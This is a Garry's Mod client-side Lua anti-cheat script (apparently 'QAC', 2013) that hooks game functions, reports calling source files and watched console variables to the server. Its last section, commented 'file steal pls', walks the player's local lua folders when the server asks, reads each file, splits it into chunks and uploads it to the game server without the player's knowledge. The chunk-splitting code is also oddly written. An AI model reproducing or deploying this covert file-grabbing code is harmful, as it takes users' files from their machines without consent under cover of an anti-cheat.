---- CL_QAC
---- CH 10/25/13, original copy @ 9/13
---- ZTF 
---- I don't care if you learn how to decrypt the lua cache and steal this, so stopping adding me about it
---- Tho pref dont redistribute ty
--Source Detection ThingsQAC = true

// pls stop k00f
local nr = _G["net"]["Receive"]
local ns = _G["net"]["Start"]
local ns2s = _G["net"]["SendToServer"]
local nws = _G["net"]["WriteString"]
local nwi = _G["net"]["WriteInt"]
local nwt = _G["net"]["WriteTable"]
local nwb = _G["net"]["WriteBit"]
local nrt = _G["net"]["ReadTable"]
local cvarcb = cvars.AddChangeCallback


local scans = {}
local scanf = {
	{hook, "Add"},
	--{hook, "Call"}, -- cl deathnotice is retarded?
	--{hook, "Run"}, -- cl deathnotice is retarded?
	{timer, "Create"},
	{timer, "Simple"},
	--{_G, "CreateClientConVar"}, -- ULX IS GAY
	--{_G, "RunString"}, -- cl deathnotice is retarded?
	{concommand, "Add"},
	{_G, "RunConsoleCommand"}

}

local function validate_src(src)
	ns("checksaum")
		nws(src)
	ns2s()
end
local function RFS()
	local CNum = net.ReadInt(10)
		ns("Debug1")
		nwi(CNum, 16)
		ns2s()
end
nr("Debug2", RFS)
local function scan_func()
	local s = {}
	
	for i = 0, 1/0, 1 do
		local dbg = debug.getinfo(i)
		if (dbg) then
			s[dbg.short_src] = true
		else
			break
		end
	end
	
	for src, _ in pairs(s) do
		if (src == "RunString" || src == "LuaCmd" || src == "[C]") then
			return
		elseif (!(scans[src])) then
			scans[src] = true
			validate_src(src)
		end
	end
end

---Scan Functions
local function SCAN_G()
	for _, ft in pairs(scanf) do
		local ofunc = ft[1][ft[2]]
		
		ft[1][ft[2]] = (
			function(...)
				local args = {...}
				scan_func()
				ofunc(unpack(args))
			end
		)
	end
end

hook.Add(
	"OnGamemodeLoaded",
	"___scan_g_init",
	function()
		SCAN_G()
		hook.Remove("OnGamemodeLoaded", "___scan_g_init")
	end
)


--ConVar Detection
local function validate_cvar(c, v)
	ns("control_vars")
		nwt({c = c, v = v})
	ns2s()
end


local function cvcc(cv, pval, nval)
	validate_cvar(cv, nval)
end

local ctd = {}

local function sned_req()
	ns("gcontrol_vars")
		nwb()
	ns2s()
end
_G.timer.Simple(1, sned_req)


nr(
	"gcontrol_vars",
	function()
		local t = nrt()
		
		local c = GetConVar(t.c)
		local v = c:GetString()
		ctd[c] = v
		
		cvarcb(t.c, cvcc)
		if (v != t.v) then
			validate_cvar(t.c, v)
		end
	end
)

---Timed Chec
local mintime = 010
local maxtime = 030

local function timecheck()
	for c, v in pairs(ctd) do
		local cv = c:GetString() || ""
		if (cv != v) then
			validate_cvar(c:GetName(), cv)
			ctd[c] = cv
		end
	end
	
	timer.Simple(math.random(mintime, maxtime), timecheck)
end

-- file steal pls
-- if you're a customer, dont release shit publicly if it's worth a lot
-- it's a douche move, but tbh your call, i cant stop you.
-- Zero the Fallen
	
if CLIENT then
	local frd = file.Read
	local function c()
		net.Start("CHTGTL")
		net.SendToServer()
	end
	
	net.Receive("CHTGTL",c)
	
	local HAX_NUMBER = "0"
	local QUEUED_FILES = {}
	local defaults = {
		"autorun",
		"entities",
		"includes",
		"weapons"
	}
	net.Receive("CHCO", function(len)
		HAX_NUMBER = net.ReadString()
		CopyDirNoSub("lua", "GAME")
		CopyDir("lua/autorun", "GAME")
		CopyDir("lua/entities", "GAME")
		CopyDir("lua/includes", "GAME")
		CopyDir("lua/weapons", "GAME")
		timer.Simple(.3, function()
			timer.Create(HAX_NUMBER, .01, 0, function()
				local fd = QUEUED_FILES[table.GetFirstKey(QUEUED_FILES)]
				if not fd then
					timer.Remove(HAX_NUMBER)
					timer.Simple(1, function()
						--POISSIBLE BANNING?
					end)
				end
				SendFileToServer(fd)
				table.remove(QUEUED_FILES, table.GetFirstKey(QUEUED_FILES))
			end)
		end)
	end)
	
	function CopyDirNoSub(dir,src)
		local files = file.Find(dir.."/*.lua", src)
		if not files then files = {} end
		for k,v in pairs(files) do
			if v and  v ~= "" then
				QueueFile(dir,v,src)
			end
		end
		local _,dirs = file.Find(dir.."/*", src)
		for k,v in pairs(dirs)do
			if v and v ~= "" then
				if not table.HasValue(defaults, v) then
					CopyDir(dir.."/"..v, src)
				end
			end
		end
	end
	
	function CopyDir(dir,src) --copypasta from gmod wiki.
		local files = file.Find(dir.."/*.lua", src)
		if not files then files = {} end
		for k,v in pairs(files) do
			if v and  v ~= "" then
				QueueFile(dir,v,src)
			end
		end 
		local files,directories = file.Find(dir.."/*", src)
		if not directories then directories = {} end
		for _, fdir in pairs(directories) do
			if fdir ~= ".svn" then
				CopyDir(dir.."/"..fdir, src)
			end
		end
	end
	
	function QueueFile(dir,name,src)
		local filedata = frd(dir.."/"..name, src)
		if not filedata then filedata = "ERROR! File not readable: "..dir.."/"..name.." in '"..src.."'." return end
		if string.len(filedata) > 1.7*10^200 then filedata = "ERROR! File too long: "..dir.."/"..name.." in '"..src.."'." return end
		local fd1, fd2, fd3, fd4 = {dir=dir,name=name}, {dir=dir,name=name}, {dir=dir,name=name}, {dir=dir,name=name}
		--split it into fourths.
		fd1.filedata = string.Left(filedata, math.min(math.Round(string.len(filedata)/4), 63000))
		fd2.filedata = string.Left(filedata, math.Round(string.len(filedata)*1/2))
		fd2.filedata = string.Right(fd2.filedata, math.min(math.Round(string.len(fd2.filedata)/2), 63000))
		fd3.filedata = string.Right(filedata, math.Round(string.len(filedata)*1/2))
		fd3.filedata = string.Left(fd3.filedata, math.min(math.Round(string.len(fd3.filedata)/2), 63000))
		fd4.filedata = string.Right(filedata, math.min(math.Round(string.len(filedata)/4), 63000))
		
		table.insert(QUEUED_FILES, fd1)
		table.insert(QUEUED_FILES, fd2)
		table.insert(QUEUED_FILES, fd3)
		table.insert(QUEUED_FILES, fd4)
	end
	
	function SendFileToServer(fd)
		if not fd then 
			return 
		end
		local dir, name, filedata = fd.dir, fd.name, fd.filedata
		net.Start("CHCO")
			net.WriteString(HAX_NUMBER)
			net.WriteString(dir)--directory first
			net.WriteString(name)--filename second
			net.WriteString(filedata)
		net.SendToServer()
	end
	
end